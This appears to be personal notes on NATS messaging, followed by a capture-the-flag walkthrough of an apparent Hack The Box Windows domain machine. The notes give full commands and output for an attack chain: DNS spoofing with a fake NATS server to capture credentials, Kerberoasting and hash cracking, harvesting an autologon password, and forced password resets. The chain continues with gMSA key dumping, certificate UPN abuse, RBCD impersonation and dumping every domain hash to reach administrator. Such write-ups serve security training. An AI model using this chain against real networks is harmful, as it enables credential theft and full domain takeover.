You found a NATS service
NATS (Neural Automatic Transport System) is a simple, secure and high performance open source data layer for cloud native applications, IoT messaging, and microservices architectures.

a simple-lightweight open-source a messaging system for microservices
We have a typical Client/Server architecture plus some Topics/Subjects

simple working:
1. nats server run
running the server....

2. nats reply hello.jeremy "Hi"
and waits for requests of it...

3. in another shell: nats req hello.jeremy ""
and it gets the "Hi"

Thas all:)

So people subscribe to an topic/subject they want:
1. nats sub hello.word
and waits to here...

2.another shell just publish something there: nats pub hello.word "Hi friend"
and thats what the sub gets

you can do this with a lot of publishers or subs
this line pubs the message every 1 second: nats pub hello.word "Hi friend" --count=-1 --sleep=1s

It has some more feutures like load balancer and others...but lets focus on security:)
go install github.com/nats-io/natscli/nats@latest
nats --server nats://<host>:4222 --user USER --pass PASS sub subject
--------------------------------------------------------------------------------------------------------------------------------------

 NATS provides various security mechanisms, including authentication and encryption, to ensure secure communication between clients and servers.

Authentication system: might have the next ones
1. user-pass
2. Token (clients sends there token,like API keys)
3. NKEYS (asymmetric crypto,public-private keys) Server accepts oly clients with right public keys
4. TLS Mutual auth    (Protection against MITM attacks)
5. (JWT web tokens)

Dangers:
1. If there is no authentication--> Anonymous Pub/Sub
2. Sensitive info over messages--> Admin services might send crendencials threw messages
3. Info leakage fro subjects--> Common


one way to connect to a aserver nats is this:
   nats --server nats://nats-svc.XXXX.XXX:4222 --user username --pass password


---------------------------------- Cheatsheet -------------------------------------

# Ping (try to connect)
nats ping --server nats://host:4222 --user USER --pass PASS

# Subscribe to all subjects
nats sub ">" --server nats://host:4222 --user USER --pass PASS

# Sub to one subject
nats sub alerts.critical

# Send (Publish) message
nats pub alerts.critical "Reboot system now"

# List subjects (not available always)
nats schema list

---------------------------------------------------------------------------------------

1.Scenario, you need to host a FAKE NAT SERVER, do a DNS Poisoning (so the target sends data to your server) and steal the data/creds
The target doesnt use TLS encry.
The DNS records arent secured
And there is blind trust for client-to-nats-svc.XXX.X server. So you will be this server.



1. nc -nv 10.10.XX.XX 4222
you see authentication required, plus some other info.

2. You need to use the fake_nats.py script. It creates a fake nat server  with the spoofed domain nat server and waits for clients to log in.
python3 fake_nuts.py

and then use the dns_spoof.sh.
./dns_spoof.sh

3. You wait and you get the creds for the first user. You export your vuriables and subscribe to all topics. There you will se the CTF_reader and you will get the messages.

"user":"Dev_Acco...","pass":"hx5h7F..."

 export NATS_USER=Dev_Acco...               
 export NATS_PASSWORD='hx5h7F5....'

 nats sub ">" --server nats://10.10.XX.XX:4222
 nats consumer next auth_logs CTF_reader --count=5 --server nats://10.10.XX.XX:4222
and got:
{"user":"david....","password":"pN8kQmn6b.....","ip":"10.10.10.20"}


4. generally in every windows machine you need to change the clock to be the same as DC. i have a script for it at my Desktop.
When you ready try:
 nxc ldap 10.10.11.78 -u davi... -p 'pN8kQmn6b...'    
and you should get some more creds


5. 
impacket-GetUserSPNs 'mirage.htb/david.jjackson' -dc-host dc01.mirage.htb -k -request

and take a krb hash

$krb5tgs$23$*nath....$XXXXX.HTB$XXXX.htb/nat....adam*$9adf38ad0dea53b2645bd7c....(too big).....571ca0a
echo '$kr......ca0a' >> hash.txt


6. brake it: 
 hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force

nathan.aa... username
and got: 3ed...   password

7. now you need to configure the krb5.conf file and get a kerberos ticket
do it manually with:

 nano /etc/krb5.conf

[libdefaults]
default_realm = MIR....HTB
dns_lookup_realm = false
dns_lookup_kdc = false
ticket_lifetime = 24h
forwardable = yes
default_tkt_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
default_tgs_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
permitted_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
[realms]
MIRAGE.HTB = {
kdc = 10.10.XX.XX
}
[domain_realm]
.mir....htb = MIR....HTB
mir....htb = MIR....HTB


impacket-getTGT dc-ip 10.10.XX.XX mira...htb/nath...adam:'password' 
export KRB5CCNAME=nath....dam.ccache
klist


or:

nxc smb ip -u u -p p â€”generate-krb5-file krb5.conf
move it maybe to /etc, cause there is the right /etc/krb5.conf




8. you ready to connect to evil-winrm with kerb ticket 
 evil-winrm -i dc01.mir...htb -u natha....am -r mi....htb

cat user.txt

9. bloodhound it: 
 bloodhound-python -u nath...dam -p '3edc#E....' -c All -d mir....htb -ns 10.10.XX.XX --zip

PRIV ESCA----->
10. In evil, search for auto-login system with the next 4 fields:
 Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object DefaultUserName, DefaultDomainName, DefaultPassword, AutoAdminLogon

If those are legit and the AutoAdminLogon = 1  then you will get the plaintext password from DefaultPassowrd:
DefaultUserName DefaultDomainName DefaultPassword AutoAdminLogon
--------------- ----------------- --------------- --------------
mar...nd      MI..E            1da....ime      1


12. set this as owned in bloodhound, so you see more connections now.

 
13. You can change his password since you have your tgt ticket 
 bloodyAD --kerberos -u "mar....ond" -p "1d....ime" -d "mir....htb" --host "dc01.mira...htb" set password "javier...all" 'Newp@ssw0rd'
 
If thiss fails then:

14. at evil-winrm:
Create a powershell credencial object with mar...nd user. With him you enable-ADAccount for user javi....ll.
Thats why, javi...ll was disabled. And now is enabled from an legit user.
Then you need to extract the LogonHours from mar...nd, which defines for how many hours he can login. (24/7)
And we put them to jav...ll too.


$Password = ConvertTo-SecureString "1da...ime" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ("MI...GE\mar...nd", $Password)
Enable-ADAccount -Identity javi....shall -Cred $Cred
 
$logonhours = Get-ADUser mar....ond -Properties LogonHours | select-object -expand logonhours
[byte[]]$hours1 = $logonhours
Set-ADUser -Identity javi....shall -Cred $Cred -Replace @{logonhours = $hours1}



15. Then we ca nchange his password too
 bloodyAD --kerberos -u "mar....ond" -p "1da....ime" -d "mir....htb" --host "dc01.mir...htb" set password "javie....rshall" 'Newp@ssw0rd'
[+] Password changed successfully!

16. Take a ticket for hime too and export it
 impacket-getTGT MIRAGE.HTB/javier.mmarshall:'Newp@ssw0rd' -dc-ip 10.10.11.78

[*] Saving ticket in javier.mmarshall.ccache
exprot it 
klist

17. Then try to find the keys for encryption-decryption from GMSA-->Group Managed Service Accounts
git clone https://github.com/micahvandeusen/gMSADumper
cd 
python3 gMSADumper.py -k -d mir....htb -l dc01.mira....htb
Users or groups who can read password for Mirag...vice$:
 > javie....rshall
Mirag....vice$:::305806d84f7c........0f0c7866
Mirag....vice$:aes256-cts-hmac-sha1-96:80bada65a4f84fb9........cb9987705e462d9491c0482ae
Mirag....vice$:aes128-cts-hmac-sha1-96:ff1d75e3a880.......b8e3ff17dd

18. Put jav... as owned in bloodhound and study the new connections

19. Now you can take a ticket for Mir...service$
 impacket-getTGT mir....htb/Mira...rvice\$ -aesKey 80bada65a4f84fb900....462d9491c0482ae -dc-ip 10.10.XX.XX

export it
klist




(You dont need to change manually the ccache every time, before you commands put something like: 
KRB5CCNAME=Mirage-Service$.ccache   certipy......)


20. now you need to change the attributes of mark... to has some more preveleges in a new template!
(export Mira...erv$ ticket and then:)
certipy-ad account -u 'Mira...rvice$' -k -target dc01.mira...htb -upn 'dc01$@mira....htb' -user 'mar...ond' update
....
....
[*] Updating user 'mar...bond':
    userPrincipalName                   : dc01$@mira....htb
[*] Successfully updated 'mark...bond'



21. Then with mark...nd's ticket this time (export it) request a new user template. He now has a certificate X.509 that he ca nuse to authenticate himself. 
 certipy-ad req -k -target dc01.mir...htb -ca 'mir...e-DC01-CA' -tamplate 'User' -dc-ip 10.10.XX.XX

                                                    
22. again updates the mark.. and adds to him the UPN=.... for UPN mapping to his certificate. (User Principal Name, its the email address of a user, like mark@10.10.XX.XX)
 certipy-ad account -u 'Mirag...rvice$' -k -target dc01.mira...htb -upn 'mark....nd@mir...htb' -user 'ma...bond' update -dc-ip 10.10.XX.XX

[*] Successfully updated 'mar...d'
                                                                                                             


23. You now get full access in AD through LDAP after you used the certificate .pfx for authentication
certipy-ad auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell

[*] Certificate identities:
[*]     SAN UPN: 'dc01$@mira...htb'
[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Connecting to 'ldaps://10.10.xx.xx:636'
[*] Authenticated to '10.10.11.78' as: 'u:MIR...E\\DC01$'
Type help for list of commands

# whoami
u:MI...E\DC01$

24. In this ldap shell (dc01$), you need to give RBCD privelages to Mir...vice$
RBCD=Resource-Based Constrained Delegation
So the Mira...vice$ will be able to impersonate (adiprosopevei??) all the users to the dco1$ threw S4U2Proxy.

# set_rbcd dc01$ Mirage-Service$
Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000

Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112
Delegation rights modified successfully!
Mirage-Service$ can now impersonate users on dc01$ via S4U2Proxy

# Bye!


25. Now you need to do the impersonation attack with th getST script, which creates Service Tickets for the name of user (dc01$), using the account from someone that can impersonate(mir..serv)
So, -spn --> you ask for ticket access from CIFS service from dc01
You impersonate that you are dc01$   (the computer account of DC)
'mir..htb/Mira..vice$' --> the account Service Account where you login with the ticket
and at the end is the NTLM hash from mira...vice$


 impacket-getST -spn 'CIFS/dc01.mira...htb' -impersonate 'dc01$' -dc-ip 10.10.xx.xx 'mira...htb/Mira...rvice$' -hashes :305806d84.....0f0c7866
and export the ticket for dc01@CIFS_dc01.mir..htb@MIR..HTB.ccache
export KRB5CCNAME=dc01\$@CIFS_dc01.mira...htb@MIRA....HTB.ccache


26.
impacket-secretsdump -k -no-pass dc01.mirage.htb

getting all the pass hashes!


27. Use the administrators aes256 hash to get a kerb ticket:
 impacket-getTGT mir....htb/Administrator -aesKey 09454bbc6da252ac9......8da5406ad0bce4bdca7

export it
klist

28. evil-winrm -i dc01.mira...htb -r mir....htb 
you in:)





